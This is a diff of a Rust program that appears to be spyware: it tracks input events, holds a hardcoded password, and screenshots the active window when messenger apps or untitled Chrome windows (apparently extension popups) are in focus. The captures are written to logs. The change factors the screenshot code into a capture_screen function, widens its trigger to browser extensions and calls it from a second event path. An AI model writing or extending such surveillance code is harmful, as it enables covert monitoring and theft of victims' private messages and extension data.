@@ -5,7 +5,7 @@ use winapi::um::winuser;
 use chrono::{Utc, DateTime};
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
-use active_win_pos_rs::get_active_window;
+use active_win_pos_rs::{ActiveWindow, get_active_window};
 use monitor::*;
 
 const PASS: &[u8] = b"firemouses!";
@@ -190,27 +190,7 @@ fn track(event: Event) {
                         Err(e) => println!("Error: {e:?}"),
                     };
 
-                    if is_screens(active_window.title) {
-                        let screens = Screen::all().unwrap();
-
-                        for screen in screens {
-                            // let image = screen.capture().unwrap();
-                            let image = screen.capture_area(
-                                active_window.position.x as i32,
-                                active_window.position.y as i32,
-                                active_window.position.width as u32,
-                                active_window.position.height as u32
-                            ).unwrap();
-                            image
-                                .save(format!("temp.png"))
-                                .unwrap();
-
-                            match append_screenshots() {
-                                Ok(_) => println!("Screenshots written to logs."),
-                                Err(e) => println!("Error: {e:?}"),
-                            };
-                        }
-                    }
+                    capture_screen(active_window);
                 },
                 Err(()) => {
                     println!("error occurred while getting the active window");
@@ -258,6 +238,7 @@ fn track(event: Event) {
                                 },
                                 Err(e) => println!("Error: {e:?}"),
                             };
+                            capture_screen(active_window);
                         },
                         Err(()) => {
                             println!("error occurred while getting the active window");
@@ -271,5 +252,30 @@ fn track(event: Event) {
         },
         EventType::MouseMove{x, y} => (),
         _ => (),
+    }
+}
+
+fn capture_screen(active_window: ActiveWindow) {
+    let is_extensions = active_window.title == "" && active_window.app_name == "Google Chrome";
+    if is_messengers(active_window.title) || is_extensions {
+        let screens = Screen::all().unwrap();
+
+        for screen in screens {
+            // let image = screen.capture().unwrap();
+            let image = screen.capture_area(
+                active_window.position.x as i32,
+                active_window.position.y as i32,
+                active_window.position.width as u32,
+                active_window.position.height as u32
+            ).unwrap();
+            image
+                .save(format!("temp.png"))
+                .unwrap();
+
+            match append_screenshots() {
+                Ok(_) => println!("Screenshots written to logs."),
+                Err(e) => println!("Error: {e:?}"),
+            };
+        }
     }
 }
